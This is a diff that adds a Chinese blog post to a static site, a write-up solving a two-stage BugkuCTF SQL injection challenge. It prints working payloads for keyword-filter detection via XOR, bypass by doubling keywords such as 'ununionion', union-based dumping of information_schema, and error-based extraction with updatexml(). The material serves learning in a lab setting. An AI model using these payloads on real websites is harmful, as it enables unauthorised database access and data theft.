@@ -234,6 +234,141 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.ebounce.cn/BugkuCTF-多次.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="E-bounce">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/timg.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="web小白成长记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/BugkuCTF-多次.html" itemprop="url">BugkuCTF 多次wp</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-28T19:30:06+08:00">
+                2019-01-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p></p><h1>第一次sql注入</h1><br>最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。<br><img src="/BugkuCTF-多次/1.png"><br>这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入’，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作，<br>测试了两组payload，都是报错界面（后面的一个-其实都是两个-号）<p></p>
+<p><pre><code>id=1’+or+1=1–+</code></pre></p>
+<p><pre><code>id=1’+order+by+2–+</code></pre><br>于是判断该题可能过滤了一些关键词，下面使用新姿势来测试究竟过滤了哪些关键词–异或法<br>（sql中的异或符号为^，在该符号两侧的表达式均为真或均为假时，会返回假，其余情况返回真，于是使用该方法来判断过滤的关键词）<br><img src="/BugkuCTF-多次/2.png"></p>
+<p><pre><code>id=1’^(length(“or”)!=0)–+</code></pre><br>返回了正常界面，由于已经验证过表达式id=1为真，根据异或的真值规则可以判断出只有后面的式子为假，而后面表达式的意思为判断or字符的长度为几,length()<br>会返回字符长度，由于sql里面0=False，所以后面这句表达式在于判断or字符是否为0，也就是是不是被过滤了掉了，由返回结果可以判断出or字符确实是被过滤掉了，<br>通过这种方法类似的，我们可以判断select union and 关键词都被过滤掉了，其它的关键词如union回显注入里面存在的table column schema where都未被过滤掉，下面<br>就开始注入了，可以透过双写的方式绕过关键词过滤，<br>查字段数：(这里只是or被过滤掉了，只需要双写or即可)</p>
+<p><pre><code>id=1’+oorrder+by+2–+</code></pre><br><img src="/BugkuCTF-多次/3.png"><br>字段数为2，然后构造union查询注入，当然我们需要确定回显字段，<br><img src="/BugkuCTF-多次/4.png"></p>
+<p><pre><code>id=x’+ununionion+seselectlect+1,2–+</code></pre><br>随后爆表名：</p>
+<p><pre><code>id=x’+ununionion+seselectlect+1,group_concat(table_name)+from+infoorrmation_schema.tables+where+table_schema=database()–+</code></pre><br><img src="/BugkuCTF-多次/5.png"><br>爆列名：<br><img src="/BugkuCTF-多次/6.png"></p>
+<p><pre><code>id=x’+ununionion+seselectlect+1,group_concat(column_name)+from+infoorrmation_schema.columns+where+table_name=’flag1’–+</code></pre><br>爆值：<br>flag1为：</p>
+<p><pre><code>id=x’+ununionion+seselectlect+1,group_concat(flag1)+from+flag1–+</code></pre><br><img src="/BugkuCTF-多次/7.png"><br>然而flag并不是这个，转头去爆address的值<br><img src="/BugkuCTF-多次/8.png"></p>
+<p><pre><code>id=x’+ununionion+seselectlect+1,group_concat(address)+from+flag1–+</code></pre></p>
+<p></p><h1>第二次sql注入</h1><br>点击进入了下一关又是一个sql注入，一样的id参数，而这次居然有sql的错误回显，但测试了一下union select注入似乎不可以<br>这次我们需要使用updatexml()函数的报错回显注入，需要了解该函数的可以自行百度，该函数一共有三个参数，总之第二个参数<br>似乎能和回显注入一样，能够执行，因此下面payload如下<br>爆表名：<p></p>
+<p><pre><code>id=1’and+updatexml(1,concat(‘<em>-‘,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),’</em>-‘),3)–+</code></pre><br><img src="/BugkuCTF-多次/9.png"><br>接着爆列名:<br><img src="/BugkuCTF-多次/11.png"></p>
+<p><pre><code>id=1’and+updatexml(1,concat(‘<em>-‘,(select+group_concat(column_name)+from+information_schema.columns+where+table_name=’flag2’),’</em>-‘),3)–+</code></pre><br>最后爆值找到flag：</p>
+<p><pre><code>id=1’and+updatexml(1,concat(‘<em>-‘,(select+flag2+from+flag2),’-</em>‘),3)–+</code></pre><br>updatexml()感觉在这道题的报错注入里面更像式标识符<br><img src="/BugkuCTF-多次/10.png"><br>到此为止本题结束。</p>
+
+          
+        
+      <div>
+</div>
+	  
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://www.ebounce.cn/sqli-labs-1-5-小结.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -900,7 +1035,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
